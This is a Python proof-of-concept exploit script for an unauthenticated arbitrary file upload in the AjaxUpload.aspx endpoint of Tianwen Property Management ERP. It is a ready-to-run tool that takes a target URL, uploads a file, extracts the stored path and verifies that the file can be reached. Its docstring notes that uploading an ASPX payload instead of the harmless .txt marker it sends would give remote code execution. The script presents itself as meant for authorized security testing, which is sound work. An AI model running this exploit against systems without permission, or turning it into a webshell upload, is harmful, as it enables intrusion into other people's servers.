#!/usr/bin/env python3
"""
Tianwen Property ERP - Unauthenticated File Upload PoC
========================================================
Single-target proof-of-concept for an unauthenticated arbitrary file upload
in the /HM/M_Main/AjaxUpload.aspx endpoint of Tianwen Property Management ERP
(天问物业ERP系统).

The upload endpoint accepts files with no extension whitelist and stores them
under /HM/M_Main/UploadFiles/, returning the relative path in the response.

Impact: an unauthenticated attacker can upload a benign marker to prove the
flaw, or (in a real attack) an ASPX payload leading to remote code execution
on the Windows/IIS host.

This PoC uploads a HARMLESS .txt marker only. It does NOT upload a webshell,
does NOT execute commands, and is intended for authorized testing of
systems you own or have written permission to test.

Usage:
    python3 poc.py --url http://target/ --verify
    python3 poc.py --url http://target/ --output ./evidence/ --timeout 15
"""

import argparse
import re
import secrets
import sys
from urllib.parse import urljoin

import requests

UPLOAD_ENDPOINT = "/HM/M_Main/AjaxUpload.aspx"
MARKER_BODY = (
    "Tianwen-ERP-Unauth-Upload-PoC\n"
    "This file was uploaded by an authorized security test.\n"
    "Delete it after verification.\n"
)


def build_multipart_body(boundary: str, filename: str, content: str) -> bytes:
    """Construct a multipart/form-data body using the UpFileData field."""
    parts = [
        f"--{boundary}\r\n".encode(),
        f'Content-Disposition: form-data; name="UpFileData"; filename="{filename}"\r\n'.encode(),
        b"Content-Type: text/plain\r\n\r\n",
        content.encode(),
        f"\r\n--{boundary}--\r\n".encode(),
    ]
    return b"".join(parts)


def extract_upload_paths(response_text: str) -> list[str]:
    """Pull uploaded file paths echoed back in the response body."""
    paths = re.findall(r"/HM/M_Main/UploadFiles/[^\"']+\.(?:aspx|txt)", response_text)
    clean = []
    for p in paths:
        for ext in (".aspx", ".txt"):
            if ext in p:
                clean.append(p.split(ext)[0] + ext)
                break
    return list(dict.fromkeys(clean))


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", required=True, help="Base URL of the target, e.g. http://target/")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout in seconds")
    parser.add_argument("--output", help="Directory to write evidence files to")
    parser.add_argument("--verify", action="store_true", help="Fetch the uploaded marker to confirm it is reachable")
    args = parser.parse_args()

    base = args.url.rstrip("/")
    upload_url = base + UPLOAD_ENDPOINT

    boundary = "----TianwenPoC" + secrets.token_hex(8)
    filename = "secpoc_" + secrets.token_hex(4) + ".txt"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Content-Type": f"multipart/form-data; boundary={boundary}",
    }

    print(f"[*] Target     : {base}")
    print(f"[*] Endpoint   : {upload_url}")
    print(f"[*] Filename   : {filename}")

    try:
        resp = requests.post(
            upload_url,
            headers=headers,
            data=build_multipart_body(boundary, filename, MARKER_BODY),
            timeout=args.timeout,
            verify=False,
        )
    except requests.exceptions.RequestException as exc:
        print(f"[!] Request failed: {exc}")
        return 1

    print(f"[*] HTTP {resp.status_code}")

    paths = extract_upload_paths(resp.text)
    if not paths:
        print("[!] No uploaded path echoed in the response. Target may be patched or not vulnerable.")
        return 1

    print("[+] Uploaded file path(s) returned by the server:")
    marker_path = None
    for p in paths:
        print(f"    - {p}")
        if p.endswith(".txt"):
            marker_path = p

    if marker_path is None:
        print("[!] No .txt path found (only .aspx echoed).")
        return 1

    marker_url = urljoin(base + "/", marker_path.lstrip("/"))

    if args.verify:
        try:
            check = requests.get(marker_url, timeout=args.timeout, verify=False)
            if check.status_code == 200 and "Tianwen-ERP-Unauth-Upload-PoC" in check.text:
                print(f"[+] Marker reachable at: {marker_url}")
            else:
                print(f"[?] Marker returned HTTP {check.status_code} but content did not match. "
                      "File may have been renamed or filtered.")
        except requests.exceptions.RequestException as exc:
            print(f"[!] Verification request failed: {exc}")

    if args.output:
        from pathlib import Path
        outdir = Path(args.output)
        outdir.mkdir(parents=True, exist_ok=True)
        evidence = outdir / "evidence.txt"
        evidence.write_text(
            f"target={base}\n"
            f"endpoint={upload_url}\n"
            f"filename={filename}\n"
            f"returned_path={marker_path}\n"
            f"marker_url={marker_url}\n"
        )
        print(f"[*] Evidence written to {evidence}")

    print("\n[!] REMOVE the uploaded marker file from the server after testing.")
    return 0


if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    sys.exit(main())
